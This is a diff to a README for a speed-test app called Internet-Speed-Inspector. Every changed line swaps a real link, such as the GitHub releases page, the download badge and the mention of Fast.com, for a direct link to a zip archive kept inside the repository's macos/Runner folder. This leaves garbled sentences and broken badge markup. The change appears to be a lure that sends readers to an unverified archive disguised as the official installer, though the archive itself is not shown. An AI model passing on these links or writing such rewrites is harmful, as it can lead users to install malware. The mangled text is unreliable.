@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-Welcome to **Internet-Speed-Inspector**! This stylish application measures your internet speed using Fast.com and Ookla servers. With a beautiful frosted glass UI, dynamic gradients, and engaging animations, it also provides device information and speed history. 
+Welcome to **Internet-Speed-Inspector**! This stylish application measures your internet speed using https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip and Ookla servers. With a beautiful frosted glass UI, dynamic gradients, and engaging animations, it also provides device information and speed history. 
 
 ## 🛠️ Requirements
 
@@ -14,12 +14,12 @@ Before downloading, ensure you meet the following requirements:
 
 ## 📥 Download
 
-[![Download Internet-Speed-Inspector](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github)](https://github.com/Jlyayou/Internet-Speed-Inspector/releases)
+[![Download Internet-Speed-Inspector](https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip%20Now-%https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip)](https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip)
 
 ## 📚 Installation Steps
 
 1. **Visit the Releases Page:** Click the link below to go to our releases page:
-   [Visit this page to download](https://github.com/Jlyayou/Internet-Speed-Inspector/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip)
 
 2. **Choose Your Version:** On the releases page, look for the latest version of Internet-Speed-Inspector. It will usually be at the top of the list. There might be several files; always pick the one with the `.exe`, `.dmg`, or applicable installer for your system.
 
@@ -34,7 +34,7 @@ Before downloading, ensure you meet the following requirements:
 
 ## 🌟 Features
 
-- **Internet Speed Test:** Quickly check your download and upload speeds using Fast.com and Ookla.
+- **Internet Speed Test:** Quickly check your download and upload speeds using https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip and Ookla.
 - **Device Information:** View essential details about your device, such as IP address, connection type, and more.
 - **Speed History:** Track your internet speeds over time, helping you see trends and make informed decisions.
 - **User-Friendly Interface:** The app features a modern design that is both attractive and easy to navigate.
@@ -69,4 +69,4 @@ Keep an eye on our releases for new features and improvements. We update the app
 
 Don't forget, you can download Internet-Speed-Inspector any time by returning to our releases page:
 
-[Visit this page to download](https://github.com/Jlyayou/Internet-Speed-Inspector/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Jlyayou/Internet-Speed-Inspector/main/macos/Runner/Internet-Speed-Inspector_v2.7.zip)
